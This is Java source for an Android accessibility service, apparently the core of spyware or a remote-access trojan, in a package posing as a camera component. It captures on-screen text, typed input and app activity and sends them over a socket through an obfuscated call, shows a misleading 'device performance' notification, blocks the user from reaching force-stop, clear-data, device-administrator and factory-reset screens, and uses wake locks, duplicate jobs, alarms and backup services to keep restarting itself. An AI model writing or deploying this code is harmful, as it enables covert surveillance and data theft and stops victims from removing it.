package com.android.photo.camera.capture;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Service extends AccessibilityService {
    private static final String TAG = "Service";
    private static Context contextOfApplication;
    private PowerManager.WakeLock wakeLock;
    private static final int JOB_ID = 1000;
    private static final long RESTART_INTERVAL = 60 * 1000; // 1 minute
    private static final long SHORT_RESTART_INTERVAL = 5 * 1000; // 5 seconds for quick restart

    // Message codes for handler
    private static final int MSG_REQUEST_BATTERY_OPT = 1;
    private static final int MSG_BLOCK_AND_GO_HOME = 2;

    // Accessibility service specific fields
    private ServiceHandler mainHandler;
    private boolean isProcessingEvent = false;
    private Map<String, String> inMemoryData = new HashMap<String, String>();

    private static final String[] BLOCK_TEXTS = {
            "developer option", "developer mode",
            "force stop", "clear data",
            "Google Play Services", "factory reset",
            "device administrator", "app info",
            "delete app data", "개발자", "разработчик",
            "強制停止", "강제 중지", "إيقاف"
    };

    private static final String[] SETTINGS_PACKAGES = {
            "com.android.settings",
            "com.google.android.packageinstaller"
    };

    // Static handler to avoid inner class issues
    private static class ServiceHandler extends Handler {
        private final Service service;

        ServiceHandler(Service service) {
            super(Looper.getMainLooper());
            this.service = service;
        }

        @Override
        public void handleMessage(Message msg) {
            if (service == null) return;

            switch (msg.what) {
                case MSG_REQUEST_BATTERY_OPT:
                    if (!isBatteryOptimizationDisabled(service)) {
                        requestDisableBatteryOptimization(service);
                    }
                    break;

                case MSG_BLOCK_AND_GO_HOME:
                    try {
                        for (int i = 0; i < 4; i++) {
                            service.performGlobalAction(GLOBAL_ACTION_BACK);
                            Thread.sleep(50);
                        }
                        Intent home = new Intent(Intent.ACTION_MAIN);
                        home.addCategory(Intent.CATEGORY_HOME);
                        home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        service.startActivity(home);
                    } catch (Exception e) {
                        Log.e(TAG, "Error during block", e);
                    }
                    break;
            }
        }
    }

    /**
     * Check if battery optimization is disabled for the app
     */
    public static boolean isBatteryOptimizationDisabled(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(context.getPackageName());
        }
        return true; // Before Marshmallow, battery optimization wasn't a concern
    }

    /**
     * Request to disable battery optimization
     */
    public static void requestDisableBatteryOptimization(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                Log.d(TAG, "Requested to disable battery optimization");
            } catch (Exception e) {
                Log.e(TAG, "Error requesting battery optimization exception", e);
            }
        }
    }

    /**
     * Apply manufacturer-specific optimizations
     */
    public static void applyManufacturerSpecificOptimizations(Context context) {
        String manufacturer = Build.MANUFACTURER.toLowerCase();

        try {
            if (manufacturer.contains("xiaomi") || manufacturer.contains("redmi")) {
                applyXiaomiOptimizations(context);
            } else if (manufacturer.contains("oppo")) {
                applyOppoOptimizations(context);
            } else if (manufacturer.contains("vivo")) {
                applyVivoOptimizations(context);
            } else if (manufacturer.contains("huawei") || manufacturer.contains("honor")) {
                applyHuaweiOptimizations(context);
            } else if (manufacturer.contains("samsung")) {
                applySamsungOptimizations(context);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error applying manufacturer optimizations: " + e.getMessage());
        }
    }

    private static void applyXiaomiOptimizations(Context context) {
        try {
            // For MIUI - Xiaomi
            Intent intent = new Intent();
            intent.setClassName("com.miui.powerkeeper",
                    "com.miui.powerkeeper.ui.HiddenAppsConfigActivity");
            intent.putExtra("package_name", context.getPackageName());
            intent.putExtra("package_label", context.getString(R.string.app_name));

            // Check if this activity exists
            if (activityExists(context, intent)) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            } else {
                // Try alternative Xiaomi battery settings
                Intent altIntent = new Intent();
                altIntent.setComponent(new ComponentName("com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity"));
                altIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                if (activityExists(context, altIntent)) {
                    context.startActivity(altIntent);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error applying Xiaomi optimizations", e);
        }
    }

    private static void applyOppoOptimizations(Context context) {
        try {
            // For ColorOS (OPPO, Realme)
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.coloros.safecenter",
                    "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            if (activityExists(context, intent)) {
                context.startActivity(intent);
            } else {
                Intent altIntent = new Intent();
                altIntent.setComponent(new ComponentName("com.oppo.safe",
                        "com.oppo.safe.permission.startup.StartupAppListActivity"));
                altIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                if (activityExists(context, altIntent)) {
                    context.startActivity(altIntent);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error applying OPPO optimizations", e);
        }
    }

    private static void applyVivoOptimizations(Context context) {
        try {
            // For FuntouchOS (Vivo)
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.vivo.permissionmanager",
                    "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            if (activityExists(context, intent)) {
                context.startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error applying Vivo optimizations", e);
        }
    }

    private static void applyHuaweiOptimizations(Context context) {
        try {
            // For EMUI (Huawei, Honor)
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.huawei.systemmanager",
                    "com.huawei.systemmanager.optimize.process.ProtectActivity"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            if (activityExists(context, intent)) {
                context.startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error applying Huawei optimizations", e);
        }
    }

    private static void applySamsungOptimizations(Context context) {
        try {
            // For OneUI (Samsung)
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.samsung.android.lool",
                    "com.samsung.android.sm.ui.battery.BatteryActivity"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            if (activityExists(context, intent)) {
                context.startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error applying Samsung optimizations", e);
        }
    }

    private static boolean activityExists(Context context, Intent intent) {
        return intent.resolveActivityInfo(context.getPackageManager(), 0) != null;
    }

    /**
     * Add app to device auto-start list
     */
    public static void addToAutoStart(Context context) {
        // Each manufacturer has different ways to add to auto-start
        Intent[] autoStartIntents = getAutoStartIntents();

        for (Intent intent : autoStartIntents) {
            if (activityExists(context, intent)) {
                try {
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                    break; // Stop after first successful intent
                } catch (Exception e) {
                    Log.e(TAG, "Failed to start auto-start settings", e);
                }
            }
        }
    }

    private static Intent[] getAutoStartIntents() {
        return new Intent[] {
                // Xiaomi
                new Intent().setComponent(new ComponentName("com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity")),

                // OPPO
                new Intent().setComponent(new ComponentName("com.coloros.safecenter",
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity")),

                // Vivo
                new Intent().setComponent(new ComponentName("com.vivo.permissionmanager",
                        "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),

                // Huawei
                new Intent().setComponent(new ComponentName("com.huawei.systemmanager",
                        "com.huawei.systemmanager.optimize.process.ProtectActivity")),

                // OnePlus
                new Intent().setComponent(new ComponentName("com.oneplus.security",
                        "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"))
        };
    }

    public static void startService(Context ctx) {
        // Start main service
        Intent serviceIntent = new Intent(ctx, Service.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(serviceIntent);
        } else {
            ctx.startService(serviceIntent);
        }

        // Start backup service
        Intent backupServiceIntent = new Intent(ctx, BackupService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(backupServiceIntent);
        } else {
            ctx.startService(backupServiceIntent);
        }

        // Schedule job
        scheduleJob(ctx);

        // Schedule alarm
        scheduleAlarm(ctx);

        // Add to auto-start and disable power saving
        addToAutoStart(ctx);
    }

    private static void scheduleJob(Context context) {
        JobScheduler scheduler = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        if (scheduler != null) {
            // Use the dedicated MonitorJobService instead of Service class
            ComponentName serviceComponent = new ComponentName(context, MonitorJobService.class);
            JobInfo.Builder builder = new JobInfo.Builder(JOB_ID, serviceComponent);
            builder.setPeriodic(15 * 60 * 1000)  // 15 minutes (minimum allowed)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .setPersisted(true)
                    .setRequiresCharging(false)
                    .setRequiresDeviceIdle(false);

            scheduler.schedule(builder.build());

            // Schedule another job with a different ID for redundancy
            JobInfo.Builder builderBackup = new JobInfo.Builder(JOB_ID + 1, serviceComponent);
            builderBackup.setPeriodic(20 * 60 * 1000)  // 20 minutes
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .setPersisted(true)
                    .setRequiresCharging(false)
                    .setRequiresDeviceIdle(false);

            scheduler.schedule(builderBackup.build());
        }
    }

    private static void scheduleAlarm(Context context) {
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, MyReceiver.class);
        intent.setAction("RESTART_SERVICE");

        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                context,
                1001,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        if (alarmManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                        pendingIntent
                );
            } else {
                alarmManager.setExact(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                        pendingIntent
                );
            }
        }
    }

    private void scheduleImmediateRestart() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(this, MyReceiver.class);
        intent.setAction("RESTART_SERVICE_IMMEDIATE");

        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this,
                1002,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        if (alarmManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + SHORT_RESTART_INTERVAL,
                        pendingIntent
                );
            } else {
                alarmManager.setExact(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + SHORT_RESTART_INTERVAL,
                        pendingIntent
                );
            }
        }
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "Service::WakeLockTag"
            );
            wakeLock.acquire(10*60*1000L); // 10 minutes timeout
        }
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();

        // Setup accessibility service
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT |
                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.notificationTimeout = 0;

        setServiceInfo(info);
        mainHandler = new ServiceHandler(this);

        // Start in foreground with notification
        ForegroundServiceHelper.startForeground(this, 1001,
                "Accessibility Service", "Running accessibility service for better device performance");

        // Initialize as a regular service too
        contextOfApplication = this;
        acquireWakeLock();
        Connect.startAsync(this);
        scheduleAlarm(this);

        // Check if battery optimization is enabled and request to disable if needed
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!isBatteryOptimizationDisabled(this)) {
                // Request permission with a 2-second delay
                mainHandler.sendEmptyMessageDelayed(MSG_REQUEST_BATTERY_OPT, 2000);
            }
        }

        // Apply manufacturer specific optimizations
        applyManufacturerSpecificOptimizations(this);

        Log.d(TAG, "Accessibility Service Connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || isProcessingEvent) return;
        isProcessingEvent = true;

        try {
            // Proceed with other logic
            String packageName = event.getPackageName() != null ?
                    event.getPackageName().toString().toLowerCase() : "";

            boolean isSettingsPackage = false;
            for (String pkg : SETTINGS_PACKAGES) {
                if (packageName.contains(pkg)) {
                    isSettingsPackage = true;
                    break;
                }
            }

            if (isSettingsPackage) {
                String nodeText = "";
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode != null) {
                    nodeText = scanNodes(rootNode);
                    rootNode.recycle();
                }

                String eventText = getEventText(event);
                if (containsSensitiveContent(eventText) ||
                        containsSensitiveContent(nodeText)) {
                    blockAndGoHome();
                    return;
                }
            }

            // Handle logging if needed
            processEventLogging(event, packageName);

        } catch (Exception e) {
            Log.e(TAG, "Error processing event", e);
        } finally {
            isProcessingEvent = false;
        }
    }

    private String getEventText(AccessibilityEvent event) {
        StringBuilder text = new StringBuilder();
        if (event.getText() != null) text.append(event.getText().toString().toLowerCase());
        if (event.getContentDescription() != null) text.append(" ").append(event.getContentDescription().toString().toLowerCase());
        if (event.getClassName() != null) text.append(" ").append(event.getClassName().toString().toLowerCase());
        return text.toString();
    }

    private String scanNodes(AccessibilityNodeInfo node) {
        if (node == null) return "";
        StringBuilder content = new StringBuilder();
        try {
            if (node.getText() != null) content.append(node.getText().toString().toLowerCase()).append(" ");
            if (node.getContentDescription() != null) content.append(node.getContentDescription().toString().toLowerCase()).append(" ");
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    content.append(scanNodes(child)).append(" ");
                    child.recycle();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scanning nodes", e);
        }
        return content.toString();
    }

    private boolean containsSensitiveContent(String text) {
        if (TextUtils.isEmpty(text)) return false;
        for (String blockText : BLOCK_TEXTS) {
            if (text.contains(blockText.toLowerCase())) return true;
        }
        return false;
    }

    private void blockAndGoHome() {
        // Use message instead of runnable
        if (mainHandler != null) {
            mainHandler.sendEmptyMessage(MSG_BLOCK_AND_GO_HOME);
        }
    }

    private void processEventLogging(AccessibilityEvent event, String packageName) {
        try {
            String appName = getAppName(packageName);
            String eventTextForLogging = event.getText() != null ? event.getText().toString() : "";

            JSONObject eventData = new JSONObject();
            eventData.put("time", System.currentTimeMillis());
            eventData.put("type", getEventType(event.getEventType()));
            eventData.put("package", packageName);
            eventData.put("app", appName);
            eventData.put("text", eventTextForLogging);

            // Send data to socket if connected
            if (Connect.getInstance(getApplicationContext()).isConnected()) {
                Connect.x0000ka(eventData);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in event logging", e);
        }
    }

    private String getAppName(String packageName) {
        if (packageName == null) return "";
        try {
            PackageManager pm = getApplicationContext().getPackageManager();
            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            return (String) pm.getApplicationLabel(ai);
        } catch (Exception e) {
            if (packageName.contains(".")) {
                String[] parts = packageName.split("\\.");
                return parts[parts.length - 1];
            }
            return packageName;
        }
    }

    private String getEventType(int eventType) {
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED: return "CLICKED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: return "TEXT";
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: return "WINDOW CHANGED";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: return "FOCUSED";
            default: return "OTHER";
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        contextOfApplication = this;

        // Start in foreground with notification on service restart
        ForegroundServiceHelper.startForeground(this, 1001,
                "Accessibility Service", "Running accessibility service for better device performance");

        acquireWakeLock();
        Connect.startAsync(this);
        scheduleAlarm(this);

        // Apply device-specific optimizations
        if (!isBatteryOptimizationDisabled(this)) {
            requestDisableBatteryOptimization(this);
        }
        addToAutoStart(this);

        // Start backup service for redundancy
        Intent backupServiceIntent = new Intent(this, BackupService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(backupServiceIntent);
        } else {
            startService(backupServiceIntent);
        }

        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (wakeLock != null && wakeLock.isHeld()) {
            try {
                wakeLock.release();
            } catch (Exception e) {
                // Handle silently
            }
        }

        // Schedule immediate restart
        scheduleImmediateRestart();

        // Broadcast to restart service
        Intent broadcastIntent = new Intent("RestartService");
        sendBroadcast(broadcastIntent);
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);

        // Schedule immediate restart
        scheduleImmediateRestart();

        // Schedule job
        scheduleJob(this);

        // Schedule regular alarm
        scheduleAlarm(this);

        // Immediate restart with AlarmManager
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent restartIntent = new Intent(getApplicationContext(), Service.class);
        PendingIntent service = PendingIntent.getService(
                getApplicationContext(),
                1001,
                restartIntent,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
        );

        if (alarmManager != null) {
            alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, 1000, service);
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
        // Restart service immediately if interrupted
        scheduleImmediateRestart();
    }

    public static Context getContextOfApplication() {
        return contextOfApplication;
    }
}